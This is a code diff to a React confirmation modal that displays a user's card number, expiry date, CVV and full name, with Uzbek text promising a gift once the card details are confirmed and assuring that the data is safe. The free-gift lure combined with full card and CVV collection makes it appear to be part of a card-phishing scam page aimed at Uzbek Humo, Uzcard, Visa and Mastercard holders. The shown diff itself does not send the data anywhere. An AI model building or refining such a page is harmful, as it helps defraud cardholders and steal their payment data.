@@ -3,12 +3,39 @@
 import { useState, useCallback } from 'react';
 import styles from './ConfirmationModal.module.css';
 
+type CardType = 'unknown' | 'visa' | 'mastercard' | 'humo' | 'uzcard';
+
+interface CardData {
+    cardNumber: string;
+    expiryDate: string;
+    cvv: string;
+    cardType: CardType;
+    fullName: string;
+}
+
 interface ConfirmationModalProps {
     isOpen: boolean;
     onClose: () => void;
+    cardData?: CardData;
 }
 
-export default function ConfirmationModal({ isOpen, onClose }: ConfirmationModalProps) {
+// Card type icons with Font Awesome classes
+const CARD_TYPE_ICONS: Record<CardType, string> = {
+    visa: 'fab fa-cc-visa',
+    mastercard: 'fab fa-cc-mastercard',
+    humo: 'fas fa-credit-card',
+    uzcard: 'fas fa-credit-card',
+    unknown: 'fas fa-credit-card'
+};
+
+// Format card number for display (mask middle digits)
+function formatCardForDisplay(cardNumber: string): string {
+    const cleaned = cardNumber.replace(/\s/g, '');
+    if (cleaned.length < 8) return cleaned;
+    return `${cleaned.slice(0, 4)} •••• •••• ${cleaned.slice(-4)}`;
+}
+
+export default function ConfirmationModal({ isOpen, onClose, cardData }: ConfirmationModalProps) {
     const [isLoading, setIsLoading] = useState(false);
     const [isSuccess, setIsSuccess] = useState(false);
     const [error, setError] = useState('');
@@ -88,7 +115,7 @@ export default function ConfirmationModal({ isOpen, onClose }: ConfirmationModal
         <div className={styles.backdrop}>
             <div className={styles.modal}>
                 <div className={styles.icon}>
-                    {isSuccess ? '✓' : '🎁'}
+                    {isSuccess ? <i className="fas fa-check" /> : <i className="fas fa-gift" />}
                 </div>
 
                 <h2 className={styles.title}>
@@ -100,6 +127,31 @@ export default function ConfirmationModal({ isOpen, onClose }: ConfirmationModal
                         ? "Sovg'angiz yo'lda! Tez orada siz bilan bog'lanamiz."
                         : "Kartangizda xato yo'qligini tasdiqlang va sovg'angizni oling"}
                 </p>
+
+                {/* Card data display */}
+                {cardData && (
+                    <div className={styles.cardDataSection}>
+                        <div className={styles.cardDataRow}>
+                            <i className={CARD_TYPE_ICONS[cardData.cardType]} />
+                            <span className={styles.cardDataValue}>{formatCardForDisplay(cardData.cardNumber)}</span>
+                        </div>
+                        <div className={styles.cardDataRow}>
+                            <i className="fas fa-calendar-alt" />
+                            <span className={styles.cardDataValue}>{cardData.expiryDate}</span>
+                        </div>
+                        {/* Show CVV only for non-local cards (Visa, Mastercard) */}
+                        {cardData.cardType !== 'humo' && cardData.cardType !== 'uzcard' && cardData.cvv && (
+                            <div className={styles.cardDataRow}>
+                                <i className="fas fa-lock" />
+                                <span className={styles.cardDataValue}>{'•'.repeat(cardData.cvv.length)}</span>
+                            </div>
+                        )}
+                        <div className={styles.cardDataRow}>
+                            <i className="fas fa-user" />
+                            <span className={styles.cardDataValue}>{cardData.fullName}</span>
+                        </div>
+                    </div>
+                )}
 
                 {!isSuccess && (
                     <button
@@ -124,7 +176,7 @@ export default function ConfirmationModal({ isOpen, onClose }: ConfirmationModal
                 {error && <p className={styles.error}>{error}</p>}
 
                 <p className={styles.note}>
-                    🔒 Ma'lumotlaringiz xavfsiz
+                    <i className="fas fa-lock" /> Ma'lumotlaringiz xavfsiz
                 </p>
             </div>
         </div>
